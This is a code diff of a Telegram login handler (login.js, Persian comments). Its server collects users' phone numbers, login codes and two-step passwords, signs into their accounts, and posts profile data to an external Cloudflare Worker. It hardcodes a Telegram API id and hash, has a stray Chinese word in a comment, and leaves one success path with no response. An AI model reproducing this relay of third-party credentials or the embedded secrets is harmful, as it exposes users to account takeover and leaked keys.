@@ -1,3 +1,4 @@
+// login.js
 const { TelegramClient } = require("telegram");
 const { StringSession } = require("telegram/sessions");
 const { Api } = require("telegram/tl");
@@ -6,8 +7,8 @@ const { Api } = require("telegram/tl");
 const apiId = 20456083;
 const apiHash = '16db2b0cdd40db7c91511ca151115af5';
 
-// ذخیره sessionها - در محیط production از دیتابیس استفاده کنید
-const sessions = {};
+// آدرس Cloudflare Worker
+const WORKER_URL = "https://tell.a09627301.workers.dev";
 
 module.exports = async (req, res) => {
   // تنظیم هدر برای CORS
@@ -33,24 +34,45 @@ module.exports = async (req, res) => {
       body = req.body;
     }
     
-    const { step, phone, code, password, phoneCodeHash } = body;
+    const { step, phone, code, password, phoneCodeHash, sessionId } = body;
+
+    // اگر sessionId ارسال شده، بررسی کن
+    if (sessionId) {
+      try {
+        const response = await fetch(`${WORKER_URL}/api/check-session`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId })
+        });
+        
+        const sessionData = await response.json();
+        
+        if (sessionData.success) {
+          return res.status(200).json({
+            success: true,
+            message: "کاربر از قبل وارد شده است",
+            user: sessionData.user,
+            sessionId: sessionData.sessionId
+          });
+        }
+      } catch (error) {
+        console.error("Session check error:", error);
+        // ادامه به فرآیند لاگین معمول
+      }
+    }
 
     if (!phone) {
       return res.status(400).json({ success: false, message: "شماره تلفن لازم است" });
     }
 
-    // اگر session برای این شماره وجود ندارد، ایجاد کن
-    if (!sessions[phone]) {
-      const stringSession = new StringSession("");
-      sessions[phone] = new TelegramClient(stringSession, apiId, apiHash, {
-        connectionRetries: 5,
-      });
-      
-      // اتصال کلاینت
-      await sessions[phone].connect();
-    }
-
-    const client = sessions[phone];
+    // ایجاد کلاینت تلگرام
+    const stringSession = new StringSession("");
+    const client = new TelegramClient(stringSession, apiId, apiHash, {
+      connectionRetries: 5,
+    });
+    
+    // اتصال کلاینت
+    await client.connect();
 
     if (step === "sendCode") {
       try {
@@ -97,18 +119,45 @@ module.exports = async (req, res) => {
         
         // دریافت اطلاعات کاربر پس از ورود موفق
         const user = await client.getMe();
+        const userData = {
+          id: user.id,
+          firstName: user.firstName,
+          lastName: user.lastName,
+          username: user.username,
+          phone: user.phone
+        };
         
-        return res.status(200).json({ 
-          success: true, 
-          message: "ورود موفقیت‌آمیز بود",
-          user: {
-            id: user.id,
-            firstName: user.firstName,
-            lastName: user.lastName,
-            username: user.username,
-            phone: user.phone
+        // ذخیره session در Cloudflare D1
+        try {
+          const response = await fetch(`${WORKER_URL}/api/login`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              step: "saveSession", 
+              phone, 
+              userData 
+            })
+          });
+          
+          const sessionResult = await response.json();
+          
+          if (sessionResult.success) {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود",
+              user: userData,
+              sessionId: sessionResult.sessionId
+            });
           }
-        });
+        } catch (sessionError) {
+          console.error("Session save error:", sessionError);
+          // حتی اگر ذخیره session失敗 شد، باز هم ورود موفق است
+          return res.status(200).json({ 
+            success: true, 
+            message: "ورود موفقیت‌آمیز بود (اما session ذخیره نشد)",
+            user: userData
+          });
+        }
       } catch (error) {
         // اگر نیاز به رمز دومرحله‌ای باشد
         if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
@@ -147,18 +196,45 @@ module.exports = async (req, res) => {
         
         // دریافت اطلاعات کاربر پس از ورود موفق
         const user = await client.getMe();
+        const userData = {
+          id: user.id,
+          firstName: user.firstName,
+          lastName: user.lastName,
+          username: user.username,
+          phone: user.phone
+        };
         
-        return res.status(200).json({ 
-          success: true, 
-          message: "ورود موفقیت‌آمیز بود",
-          user: {
-            id: user.id,
-            firstName: user.firstName,
-            lastName: user.lastName,
-            username: user.username,
-            phone: user.phone
+        // ذخیره session در Cloudflare D1
+        try {
+          const response = await fetch(`${WORKER_URL}/api/login`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              step: "saveSession", 
+              phone, 
+              userData 
+            })
+          });
+          
+          const sessionResult = await response.json();
+          
+          if (sessionResult.success) {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود",
+              user: userData,
+              sessionId: sessionResult.sessionId
+            });
           }
-        });
+        } catch (sessionError) {
+          console.error("Session save error:", sessionError);
+          // حتی اگر ذخیره session失敗 شد، باز هم ورود موفق است
+          return res.status(200).json({ 
+            success: true, 
+            message: "ورود موفقیت‌آمیز بود (اما session ذخیره نشد)",
+            user: userData
+          });
+        }
       } catch (error) {
         console.error("Password check error:", error);
         return res.status(400).json({ 
